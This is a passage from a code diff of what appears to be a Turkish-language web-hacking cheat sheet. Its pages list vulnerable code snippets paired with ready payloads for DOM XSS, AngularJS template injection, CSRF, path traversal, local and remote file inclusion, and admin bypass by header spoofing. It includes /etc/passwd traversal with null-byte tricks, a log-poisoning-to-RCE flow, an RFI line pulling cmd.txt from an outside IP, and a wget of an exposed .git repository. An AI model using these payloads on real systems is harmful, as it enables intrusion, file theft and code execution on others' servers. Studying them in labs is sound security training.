decodeURIComponent(window.location.hash.slice(1)) + ')');\n\t\tif (post) post.get(0).scrollIntoView(); \n\t});\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>#&lt;img src=x onerror=print()&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'><code>hashchange</code> olayı tetiklendiğinde, script URL hash'ini (<code>#</code> sonrası) alır ve jQuery <code>:contains</code> seçicisine sokar. Eski jQuery versiyonları, bu seçiciyi parse ederken HTML olarak DOM'a enjekte eder ve <code>&lt;img&gt;</code> tag'i çalışır.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 9 - DOM XSS (document.write sink)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar searchTerms = '{PAYLOAD}';\n\tdocument.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\"&gt;');\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload (1):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>'-alert(1)-'</pre><strong style='margin-top:10px;display:block;'>Payload (2):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>';alert(1)//</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Payload 2, <code>searchTerms</code> değişkeninin string atamasından kaçar. Kod <code>var searchTerms = '';</code> (string biter), <code>alert(1)</code> (kod çalışır) ve <code>//</code> (satırın kalanını yorum yapar) olarak çalışır. <code>encodeURIComponent</code> fonksiyonu hiç çalışmaz.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 10 - DOM XSS (document.write &amp; option injection)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar stores = [\"London\",\"Paris\",\"Milan\"];\n\tvar store = (new URLSearchParams(window.location.search)).get('storeId');\n\tdocument.write('&lt;select name=\"storeId\"&gt;');\n\tif(store) {\n\t\tdocument.write('&lt;option selected&gt;'+store+'&lt;/option&gt;');\n\t}\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;/option&gt;&lt;script&gt;alert(1)&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Payload, <code>store</code> değişkeni ile <code>document.write</code>'a gider, mevcut <code>&lt;option&gt;</code> etiketini kapatır ve yeni bir <code>&lt;script&gt;</code> etiketi enjekte eder.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 11 - DOM XSS (eval() sink)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar q = (new URLSearchParams(location.search)).get('q');\n\teval('var r = \"Arama: ' + q + '\";');\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>';alert(1)//</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Payload, <code>eval()</code> içindeki string'den kaçar. <code>eval()</code> şu kodu çalıştırır: <code>var r = 'Arama: '';</code> (string'i bitir), <code>alert(1);</code> (kodu çalıştır), <code>//';</code> (kalanı yorum yap).</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 12 - DOM XSS (Backslash Escape Bypass)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar searchTerms = '{PAYLOAD}';\n\tdocument.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\"&gt;');\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Sunucu Önlemi (Açıklama):</strong><div style='margin-top:5px;'>Site, payload içindeki <code>'</code> karakterini <code>\\'</code> ile ve <code>\\</code> karakterini <code>\\\\</code> ile değiştiriyor.</div><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>\\'-alert(1)//</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>1. Girdi: <code>\\'-alert(1)//</code><br>2. Sunucu <code>\\</code> işaretini <code>\\\\</code> yapar, <code>'</code> işaretini <code>\\'</code> yapar.<br>3. Kodun son hali: <code>var searchTerms = '\\\\'-alert(1)//';</code><br>4. JS parser bunu şöyle okur: <code>var searchTerms = '\\'</code> (string biter, içinde tek bir <code>\\</code> karakteri var) + <code>-alert(1)</code> (kod çalışır) + <code>//';</code> (geri kalan yorum satırı).</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 13 - DOM XSS (Template Literal Injection via eval)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n\tvar query = (new URLSearchParams(location.search)).get('q');\n\t// Zafiyetli kısım: Girdiyi eval() ile çalıştırmak\n\teval(\`document.getElementById('searchMessage').innerText = \`Search for ${query}\`;\`);\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Payload:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>${alert(1)}</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'><b>Kritik Hata:</b> Girdi <code>innerText</code>'e gitseydi güvende olurdu. Ancak site, girdiyi backtick (<code>\`</code>) ile oluşturulan bir string'in içine koyup <b><code>eval()</code></b> ile çalıştırıyor.<br><code>eval()</code> fonksiyonu, <code>${alert(1)}</code> payload'ını bir JS ifadesi olarak algılar, çalıştırır ve sonra (<code>alert</code>'ten <code>undefined</code> döndüğü için) <code>innerText</code>'e atar.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 14 - CSTI (AngularJS)</summary><div style='margin-top:10px;'><strong>Kaynak Kod:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;!-- AngularJS 1.7.7 (veya benzeri) --&gt;</pre><strong style='margin-top:10px;display:block;'>Payload (Test):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>{{7*7}}</pre><div style='margin-top:5px;'>-&gt; Sitenin ciktisi 49 ise Client-Side Template Injection (CSTI) vardır.</div><strong style='margin-top:10px;display:block;'>Payload (XSS):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>{{constructor.constructor('alert(1)')()}}</pre></div></details></li>\n\t\t\t</ul>"
+            }
+            ]
 },
+
 idor: {
     menuName: 'IDOR',
     icon: 'icon-key',
@@ -1079,7 +1085,7 @@ Password: anything</pre>
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tanım: Kullanıcının tarayıcısı doğrulanmış oturumla hedefe izinsiz istek gönderir (ör: POST değişiklikleri).</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: State-changing endpoint (POST/PUT/DELETE) oturum çerezine bağımlı mı? Normal istek → çalışıyor mu?</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hızlı PoC: Basit bir HTML form (action=[TARGET_URL], method=POST) ve otomatik submit ile test edilir — form alanları hedef parametre isimleriyle doldurulur.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hızlı PoC (güvenlik amacıyla soyut): Basit bir HTML form (action=[TARGET_URL], method=POST) ve otomatik submit ile test edilir — form alanları hedef parametre isimleriyle doldurulur.</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Exploit (özet): Kullanıcı oturumdayken crafted sayfa ziyaret ettirilir; hedef sunucu değişiklik yapıyor ise CSRF mümkündür. Araç: Burp repeater ile isteği tekrar etmek, farkı incelemek.</li>
           </ul>
         `
@@ -1101,7 +1107,7 @@ Password: anything</pre>
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tanım: Saldırgan kullanıcının oturumunu kendi hesabına yönlendirir (session fixation-like) veya kullanıcıyı saldırgan hesabına login eder.</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tespit: Login endpoint CSRF koruması var mı? (login işlemine CSRF token eklenmiş mi?)</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hızlı PoC: Crafted form ile otomatik login denemesi — eğer hedef login isteğini CSRF koruması olmadan kabul ediyorsa login CSRF mümkündür.</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hızlı PoC (soyut): Crafted form ile otomatik login denemesi — eğer hedef login isteğini CSRF koruması olmadan kabul ediyorsa login CSRF mümkündür.</li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Etki: Kullanıcı izinsiz şekilde saldırgan hesabına bağlanır; sonrasında yetkili işlemler saldırgan tarafından takip edilebilir.</li>
           </ul>
         `
@@ -1254,86 +1260,132 @@ Password: anything</pre>
   },
 
   informationDisclosure: {
-      menuName: 'Information Disclosure',
-      icon: 'icon-file-export',
-      parent: 'vulnerabilities',
-      title: 'Information Disclosure (Bilgi Sızıntısı)',
-      description: 'Hedef sistemlerde bilgi sızıntılarını tespit etmek ve kritik dosyaları keşfetmek için adım adım uygulamalı rehber ve teorik bilgiler.',
-      sections: [
-        {
-          title: 'Wayback Machine CDX Sorgusu',
-          content: `
-            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-              <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                Wayback Machine üzerinden hedef siteye ait eski URL'leri çeker. 'example.com' kısmını hedef siteyle değiştirin.
-                <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
-                  <pre style="margin:0;white-space:pre-wrap">https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original</pre>
-                  <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
-                    onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
-                </div>
-              </li>
-            </ul>
-          `
-        },
-        {
-          title: 'Kritik Dosya Türlerini Ara',
-          content: `
-            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-              <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                URL listesinde kritik uzantıları Ctrl + F ile aratın. Bu uzantılar hassas bilgi içerebilecek dosyaları gösterir.
-                <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
-                  <pre style="margin:0;white-space:pre-wrap">pdf doc docx xls xlsx ppt pptx txt csv xml json log html htm php asp aspx js css bak old backup config zip rar tar gz jpg jpeg png gif svg</pre>
-                </div>
-              </li>
-            </ul>
-          `
-        },
-        {
-          title: 'Normal Erişilebilirlik Kontrolü',
-          content: `
-            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-              <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                Dosyayı normal tarayıcıda açmayı deneyin. Erişilebiliyorsa sızıntı olmayabilir (hala canlıdır).
-                <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
-                  <pre style="margin:0;white-space:pre-wrap">Bulunan URL'yi tarayıcıda doğrudan açın (örneğin: https://example.com/dosya.pdf)</pre>
-                </div>
-              </li>
-            </ul>
-          `
-        },
-        {
-          title: 'Bulunan URL\'leri Wayback Machinede Aç',
-          content: `
-            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-              <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                Erişim yoksa, URL'yi Wayback'e yapıştırın ve arşivlenmiş içeriği inceleyin.
-                <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
-                  <pre style="margin:0;white-space:pre-wrap">https://web.archive.org/</pre>
-                  <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
-                    onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
-                </div>
-              </li>
-            </ul>
-          `
-        },
-        {
-          title: 'Ekstra İpuçları ve Analiz',
-          content: `
-            <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-              <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                Arşiv dosyalarını indirip analiz edin. Her içerik potansiyel sızıntıdır; odak:<br>
-                1) Config'lerde API key'ler, DB info'lar - arşivde olup canlıda yoksa sızıntı.<br>
-                2) Kaynak kodlarda hardcoded veriler - strings/grep ile tarayın.<br>
-                3) Belgelerde meta/içerik verileri (e-posta, raporlar) - halka açık olmamalıysa sızıntı.<br>
-                4) Log/yedeklerde hatalar, konfig'ler - zayıflık gösterir.<br>
-                Veri güvenlik tehlikesiyse sızıntıdır. Sorguyu subdomain'lerle genişletin. Raporlayın, etik olun.
-              </li>
-            </ul>
-          `
-        }
-      ]
-  },
+  menuName: 'Information Disclosure',
+  icon: 'icon-file-export',
+  parent: 'vulnerabilities',
+  title: 'Information Disclosure (Bilgi Sızıntısı)',
+  description: 'Hedef sistemlerde bilgi sızıntılarını tespit etmek ve kritik dosyaları keşfetmek için adım adım uygulamalı rehber ve teorik bilgiler.',
+  sections: [
+    {
+      title: 'Adım 1: Wayback CDX Sorgusu',
+      content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            Wayback Machine üzerinden hedef siteye ait eski URL'leri çeker. 'example.com' kısmını hedef siteyle değiştirin.
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+              <pre style="margin:0;white-space:pre-wrap">https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original</pre>
+              <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
+                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
+            </div>
+          </li>
+        </ul>
+      `
+    },
+    {
+      title: 'Adım 2: Kritik Dosya Türlerini Ara',
+      content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            URL listesinde kritik uzantıları Ctrl + F ile aratın. Bu uzantılar hassas bilgi içerebilecek dosyaları gösterir.
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+              <pre style="margin:0;white-space:pre-wrap">pdf doc docx xls xlsx ppt pptx txt csv xml json log html htm php asp aspx js css git bak old backup config zip rar tar gz jpg jpeg png gif svg</pre>
+            </div>
+          </li>
+        </ul>
+      `
+    },
+    {
+      title: 'Adım 3: Normal Erişilebilirlik Kontrolü',
+      content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            Dosyayı normal tarayıcıda açmayı deneyin. Erişilebiliyorsa sızıntı olmayabilir (hala canlıdır).
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+              <pre style="margin:0;white-space:pre-wrap">Bulunan URL'yi tarayıcıda doğrudan açın (örneğin: https://example.com/dosya.pdf)</pre>
+            </div>
+          </li>
+        </ul>
+      `
+    },
+    {
+      title: 'Adım 4: Wayback Machine\'de Arşivlenmiş URL\'yi Aç',
+      content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            Erişim yoksa (canlıda 404 vb. alırsan), URL'yi Wayback'e yapıştırın ve arşivlenmiş içeriği inceleyin.
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+              <pre style="margin:0;white-space:pre-wrap">https://web.archive.org/</pre>
+              <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
+                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
+            </div>
+          </li>
+        </ul>
+      `
+    },
+    {
+      title: 'Adım 5: Ekstra İpuçları ve Analiz (Pasif)',
+      content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            Arşiv dosyalarını indirip analiz edin. Her içerik potansiyel sızıntıdır; odak:<br>
+            1) Config'lerde API key'ler, DB info'lar - arşivde olup canlıda yoksa sızıntı.<br>
+            2) Kaynak kodlarda hardcoded veriler - strings/grep ile tarayın.<br>
+            3) Belgelerde meta/içerik verileri (e-posta, raporlar) - halka açık olmamalıysa sızıntı.<br>
+            4) Log/yedeklerde hatalar, konfig'ler - zayıflık gösterir.<br>
+            Veri güvenlik tehlikesiyse sızıntıdır. Sorguyu subdomain'lerle genişletin. Raporlayın, etik olun.
+          </li>
+        </ul>
+      `
+    },
+    {
+      title: 'Roadmap 2: Aktif Sunucu Taraması ve Kritik Dosya Analizi',
+      content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
 
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <b>Kritik Dosya ve Dizinleri Tara:</b> Sunucuda unutulmuş/açık bırakılmış hassas yolları doğrudan dene.
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+              <pre style="margin:0;white-space:pre-wrap">/robots.txt (İzin verilmeyen yolları listeler)
+/.git/ (Tüm kaynak kod reposu!)
+/.svn/ (Eski versiyon kontrol)
+/config.bak (Eski yedek konfigürasyon)
+/sitemap.xml (Tüm site haritası)
+/phpinfo.php (Tüm sunucu bilgileri)</pre>
+            </div>
+          </li>
+
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <b>Admin Paneli/Yerel Erişim Zafiyeti:</b> "Admin interface only available to local users" gibi bir hata alırsan, sunucuya 'yerel' olduğunu düşündür.
+            <br><br>
+            1) Burp Repeater'a geç.<br>
+            2) İsteğe (Request) şu header'ı ekle:<br>
+            <pre style="margin:4px 0;white-space:pre-wrap">X-Custom-Ip-Authorization: 127.0.0.1</pre>
+            3) Diğer yaygın header'lar: <code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Real-IP: 127.0.0.1</code><br>
+            4) İsteği yolla. Erişim sağlandıysa, sunucu bu header'a güveniyor demektir.
+          </li>
+
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <b>.git Reposu Analizi:</b> Eğer <code>/.git/</code> dizinine erişim bulduysan, tüm repoyu indir ve analiz et.
+            <br><br>
+            1) Repoyu indir:
+            <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+              <pre style="margin:0;white-space:pre-wrap">wget -r https://example.com/.git/</pre>
+              <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
+                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
+            </div>
+            <br>
+            2) Görsel araçla (Git Cola vb.) veya komut satırından aç:
+            <pre style="margin:4px 0;white-space:pre-wrap">git-cola &</pre>
+            3) Geçmiş commit'leri incele. Bazen geliştiriciler şifreleri koda ekler, sonraki commit'te siler.<br>
+            4) Örnek: "undo last commit" (son commit'i geri al) yaparak veya eski commit'lere bakarak şu gibi satırları bulabilirsin:<br>
+            <pre style="margin:4px 0;white-space:pre-wrap">admin_password:jk5nfwn5opyj1</pre>
+          </li>
+
+        </ul>
+      `
+    }
+  ]
+},
 file_inclusion: {
     menuName: 'File Inclusion',
     icon: 'icon-folder-open',
@@ -1371,12 +1423,32 @@ file_inclusion: {
       {
         title: 'Path Traversal & Bypass Teknikleri',
         content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit: <code>../../../../etc/passwd</code></li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Encoding: <code>..%2f..%2f..%2fetc/passwd</code>, double-encode <code>..%252f..%252f</code></li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Null byte (eski PHP sürümlerinde): <code>../../../../etc/passwd%00</code> (modernlerde işe yaramayabilir)</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Weird forms: <code>....//....//etc/passwd</code>, octal/decimal IP trickleri ile path manipülasyonu.</li>
-          </ul>
+<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+    <b>Basit:</b> <code>../../../../etc/passwd</code> veya <code>/etc/passwd</code>
+  </li>
+  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+    <b>Encoding:</b> <code>..%2f..%2f..%2fetc/passwd</code> veya double-encode: <code>..%252f..%252f..%252fetc/passwd</code>
+  </li>
+  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+    <b>Null byte (eski PHP sürümlerinde):</b> <code>../../../../etc/passwd%00</code>
+  </li>
+  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+    <b>Weird forms:</b> <code>....//....//etc/passwd</code>, octal/decimal IP trickleri vb.
+  </li>
+
+  <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+    <b>Null Byte + Uzantı Filtresi Bypass:</b> <code>/image?filename=../../../../etc/passwd%00.jpg</code>
+    <ul style="padding-left: 20px; margin-top: 8px; font-size: 13px;">
+      <li>
+        <b><code>.jpg</code> kısmı:</b> Uygulama "sadece .jpg dosyalarını aç" diye bir filtre uyguluyor olabilir. Sona <code>.jpg</code> ekleyerek bu ilk kuralı (filtreyi) atlatırız.
+      </li>
+      <li>
+        <b><code>%00</code> (Null Byte) kısmı:</b> Bu, "metnin sonu" anlamına gelir. Sunucu, <code>...passwd%00.jpg</code> dosyasını açmaya çalıştığında <code>%00</code>'ı görür ve "Dosya adı burada bitti" der. <code>.jpg</code> kısmını yok sayar ve <code>.../etc/passwd</code> dosyasını açmaya çalışır.
+      </li>
+    </ul>
+  </li>
+</ul>
         `
       },
       {
@@ -1404,8 +1476,8 @@ file_inclusion: {
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit LFI: <code>GET /get.php?file=../../../../etc/passwd</code></li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning → RCE örnek akış: 1) User-Agent'a PHP kodu gönder (curl) 2) <code>?file=/var/log/apache2/access.log&c=whoami</code> ile include.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">RFI PoC (server izinliyse): <code>?file=http://10.10.145.212:8000/cmd.txt</code> (lab örneğinize benzer).</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Flag örnekleri (challenge tarzı): curl ile POST istekleri veya null-byte traversal denemeleri kullanılabilir (lab-provided örneklerdeki gibi).</li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">RFI PoC (server izinliyse): <code>?file=http://10.10.145.212:8000/cmd.txt</code></li>
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Flag örnekleri: curl ile POST istekleri veya null-byte traversal denemeleri kullanılabilir.</li>
           </ul>
         `
       }
@@ -1416,7 +1488,7 @@ file_inclusion: {
     menuName: 'Authentication Bypass',
     icon: 'icon-user-slash',
     parent: 'vulnerabilities',
-    title: 'Authentication Bypass',
+    title: 'Authentication Bypass (Kimlik Doğrulama Atlama)',
     description: 'Kullanıcı doğrulama akışında açıklar: username enumeration, brute force, mantık hatası ve cookie manipülasyonu. Kısa, PoC ve exploit odaklı.',
     sections: [
       {
@@ -2567,8 +2639,8 @@ toolbox: {
           <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
               <strong>Domainlere Göre Açık Bulma Olasılıkları:</strong><br>
-              - asdf.twitter.com: %15 (kısa domain, unutulma ihtimali düşük)<br>
-              - ad.sdaf.dsa.twitter.com: %25 (uzun domain, unutulma ihtimali yüksek)
+              - asdf.twitter.com: %15 (kısa subdomain, unutulma ihtimali düşük)<br>
+              - ad.sdaf.dsa.twitter.com: %25 (uzun subdomain, unutulma ihtimali yüksek)
             </li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
               <strong>Bilgi Toplama Araçları:</strong><br>
@@ -2584,7 +2656,7 @@ toolbox: {
             </li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
               <strong>İncelenmesi Gereken Status Codelar:</strong><br>
-              - <strong>200</strong>: Dosya var, içeriği incele (JS, config, key sızıntısı olabilir).<br>
+              - <strong>200</strong>: Dosya var, içeriği incele.<br>
               - <strong>301/302</strong>: Yönlendirme, login sayfası olabilir.<br>
               - <strong>401</strong>: Auth token gerekir, incele.<br>
               - <strong>403</strong>: Erişim yok ama bir şey var, test et.<br>
@@ -4230,4 +4302,3 @@ document.addEventListener('DOMContentLoaded', () => {
     </div>
     </body>
   </html>
-
